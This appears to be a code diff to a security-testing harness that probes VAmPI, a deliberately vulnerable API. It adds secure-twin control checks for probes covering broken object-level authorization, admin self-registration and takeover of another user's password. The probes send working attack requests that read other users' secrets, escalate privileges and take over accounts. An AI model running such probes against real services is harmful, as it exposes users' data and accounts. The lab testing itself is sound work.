@@ -11,6 +11,7 @@ in the loop sit on top of it, they don't replace it.
 from __future__ import annotations
 
 import os
+import re
 from dataclasses import dataclass, field
 from typing import Callable
 
@@ -36,6 +37,9 @@ class ProbeResult:
     signal: bool                       # deterministic "looks interesting" prior
     control: Exchange | None = None    # secure-twin / owner contrast
     details: dict = field(default_factory=dict)
+    # Same oracle applied to the secure twin. None when there was no usable
+    # control response; True means the secure twin also showed the signal.
+    control_signal: bool | None = None
 
 
 @dataclass
@@ -52,6 +56,34 @@ class Probe:
 
 def _rand(n: int = 6) -> str:
     return os.urandom(n).hex()
+
+
+# A title from a target listing becomes one path segment. Anything else (a "/",
+# "..", "?", "%") could steer the request to a different route, so skip it.
+_TITLE = re.compile(r"[A-Za-z0-9_-]+")
+
+
+def _others_book(listing: Exchange, attacker: str, prefer_owner: str | None = None) -> tuple[str, str] | None:
+    """First (title, owner) in a GET /books/v1 listing that the attacker does not own."""
+    body = listing.response_body if isinstance(listing.response_body, dict) else {}
+    books = body.get("Books")
+    candidates = [
+        (book["book_title"], book["user"])
+        for book in (books if isinstance(books, list) else [])
+        if isinstance(book, dict)
+        and isinstance(book.get("book_title"), str) and _TITLE.fullmatch(book["book_title"])
+        and isinstance(book.get("user"), str) and book["user"] and book["user"] != attacker
+    ]
+    if prefer_owner is not None:
+        preferred = [candidate for candidate in candidates if candidate[1] == prefer_owner]
+        candidates = preferred or candidates
+    return candidates[0] if candidates else None
+
+
+def _read_others_book(exchange: Exchange, attacker: str) -> bool:
+    """The BOLA oracle: a 200 that returns another user's secret."""
+    body = exchange.response_body if isinstance(exchange.response_body, dict) else {}
+    return exchange.status_code == 200 and "secret" in body and body.get("owner") != attacker
 
 
 class VampiTarget:
@@ -93,31 +125,42 @@ class VampiTarget:
         # path param, so it is an object reference).
         book_op = next((o for o in ops if o.method == "get" and "{book_title}" in o.path), None)
         listing = ex.send("GET", f"{self.base}/books/v1", headers=attacker.headers)
-        others_book = None
-        if isinstance(listing.response_body, dict):
-            for b in listing.response_body.get("Books", []):
-                if b.get("user") and b["user"] != attacker.name:
-                    others_book = (b["book_title"], b["user"])
-                    break
+        others_book = _others_book(listing, attacker.name)
         if book_op and others_book:
             title, owner = others_book
 
             def run_bola(e: Executor, title=title, owner=owner) -> ProbeResult:
                 atk = e.send("GET", f"{self.base}/books/v1/{title}", headers=attacker.headers)
-                ctrl = None
-                if self.control:
-                    ctok = self._login(e, self.control, "name1", "pass1")
-                    ctrl = e.send("GET", f"{self.control}/books/v1/{title}",
-                                  headers={"Authorization": f"Bearer {ctok}"})
+                signal = _read_others_book(atk, attacker.name)
                 body = atk.response_body if isinstance(atk.response_body, dict) else {}
-                signal = atk.status_code == 200 and "secret" in body and body.get("owner") != attacker.name
                 obs = (f"name1 requested book '{title}' owned by {owner}. "
                        f"status={atk.status_code}, secret_returned={'secret' in body}, "
                        f"owner_in_response={body.get('owner')}.")
-                if ctrl is not None:
-                    obs += f" secure-twin status={ctrl.status_code}."
+                details = {"object": title, "owner": owner}
+                ctrl = None
+                ctrl_signal = None
+                if self.control:
+                    # Each twin seeds its own random titles, so the vulnerable
+                    # twin's title would simply 404 here. Repeat the same test on
+                    # the secure twin with a book that twin says another user owns.
+                    ctok = self._login(e, self.control, "name1", "pass1")
+                    target = None
+                    if ctok:
+                        cheaders = {"Authorization": f"Bearer {ctok}"}
+                        clisting = e.send("GET", f"{self.control}/books/v1", headers=cheaders)
+                        target = _others_book(clisting, attacker.name, prefer_owner=owner)
+                    if target is None:
+                        details["control"] = "unavailable"
+                        obs += " secure-twin control unavailable."
+                    else:
+                        ctitle, cowner = target
+                        ctrl = e.send("GET", f"{self.control}/books/v1/{ctitle}", headers=cheaders)
+                        details.update(control_object=ctitle, control_owner=cowner)
+                        obs += f" secure-twin status={ctrl.status_code}."
+                        if ctrl.status_code is not None:
+                            ctrl_signal = _read_others_book(ctrl, attacker.name)
                 return ProbeResult(attacker=atk, observation=obs, signal=signal, control=ctrl,
-                                   details={"object": title, "owner": owner})
+                                   details=details, control_signal=ctrl_signal)
 
             probes.append(Probe(
                 id="p-bola-books", finding_id="vampi-bola-books",
@@ -140,10 +183,14 @@ class VampiTarget:
                 ctok = self._login(e, self.control, cu, "pw12345")
                 ctrl = e.send("GET", f"{self.control}/me", headers={"Authorization": f"Bearer {ctok}"})
             obs = f"registered {u} with admin=true; /me reports admin={data.get('admin')}."
+            ctrl_signal = None
             if isinstance(getattr(ctrl, "response_body", None), dict):
-                obs += f" secure-twin admin={ctrl.response_body.get('data', {}).get('admin')}."
+                cdata = ctrl.response_body.get("data", {})
+                cdata = cdata if isinstance(cdata, dict) else {}
+                obs += f" secure-twin admin={cdata.get('admin')}."
+                ctrl_signal = bool(cdata.get("admin"))
             return ProbeResult(attacker=me, observation=obs, signal=signal, control=ctrl,
-                               details={"user": u})
+                               details={"user": u}, control_signal=ctrl_signal)
 
         reg_op = next((o for o in ops if o.method == "post" and o.path.endswith("/register")), None)
         probes.append(Probe(
@@ -165,6 +212,7 @@ class VampiTarget:
             victim_new = self._login(e, self.base, victim, newpw)
             signal = bool(victim_new)
             ctrl = None
+            ctrl_signal = None
             if self.control:
                 cv = f"v_{_rand()}"; ca = f"a_{_rand()}"; cnew = "changed_" + _rand(4)
                 self._register(e, self.control, cv, "vpw12345", f"{cv}@mail.com")
@@ -173,13 +221,15 @@ class VampiTarget:
                 e.send("PUT", f"{self.control}/users/v1/{cv}/password",
                        headers={"Authorization": f"Bearer {catok}"}, json_body={"password": cnew})
                 ctrl_login = self._login(e, self.control, cv, cnew)
+                ctrl_signal = bool(ctrl_login)
                 ctrl = Exchange(method="LOGIN", url=f"{self.control}/users/v1/login",
                                 status_code=200 if ctrl_login else 401,
                                 response_body={"victim_password_changed": bool(ctrl_login)})
             obs = (f"attacker {atk} set a new password on victim {victim}; "
                    f"victim login with the new password {'SUCCEEDED' if victim_new else 'failed'}.")
             return ProbeResult(attacker=change, observation=obs, signal=signal, control=ctrl,
-                               details={"victim": victim, "attacker": atk})
+                               details={"victim": victim, "attacker": atk},
+                               control_signal=ctrl_signal)
 
         pw_op = next((o for o in ops if o.method == "put" and o.path.endswith("/password")), None)
         probes.append(Probe(
